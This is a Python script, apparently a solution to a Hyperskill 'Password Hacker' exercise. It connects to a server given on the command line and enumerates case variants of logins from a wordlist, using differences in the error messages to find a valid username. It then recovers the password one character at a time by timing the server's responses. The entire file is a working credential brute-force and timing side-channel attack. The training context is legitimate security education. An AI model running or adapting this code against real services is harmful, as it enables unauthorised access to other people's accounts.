from datetime import datetime
import socket
import json
import sys
from itertools import product
from string import ascii_letters, digits


def login_generator():
    with open('C:\\hyperskill\\logins.txt') as f:
        logins = f.readlines()
    for x in logins:
        x = x.strip('\n')
        for y in product(*((char.lower(), char.upper()) for char in x)):
            yield ''.join(y)


alphabet = ascii_letters + digits


def find_login(sckt):
    logins = login_generator()
    for _ in range(1000000):
        probably_login = next(logins)

        message = json.dumps(
            {
                "login": probably_login,
                "password": ' '
             })
        sckt.send(message.encode())

        res = json.loads(sckt.recv(1024).decode())
        if res["result"] == "Wrong password!":
            return probably_login
        elif res['result'] != "Wrong login!":
            raise Exception(f"{message}, {res['result']}")


def connect():
    with socket.socket() as cli:
        address = (sys.argv[1], int(sys.argv[2]))
        cli.connect(address)
        login = find_login(cli)
        if login is None:
            raise Exception(f"Login is null! {login}")

        password = ""
        for _ in range(10000):
            for letter in alphabet:
                credentials = json.dumps(
                    {
                        "login": login,
                        "password": (password + letter)
                    })

                cli.send(credentials.encode())
                start = datetime.now()

                result = json.loads(cli.recv(1024).decode())
                finish = datetime.now()

                difference = finish - start

                if float(str(difference).split(':')[2]) > 0.01:
                    password += letter
                if result["result"] == "Connection success!":
                    return credentials
                elif result["result"] == "Wrong password!":
                    continue
                else:  # result["result"] != "Wrong password!":
                    raise Exception(f"{credentials}, {result['result']}")


print(connect())
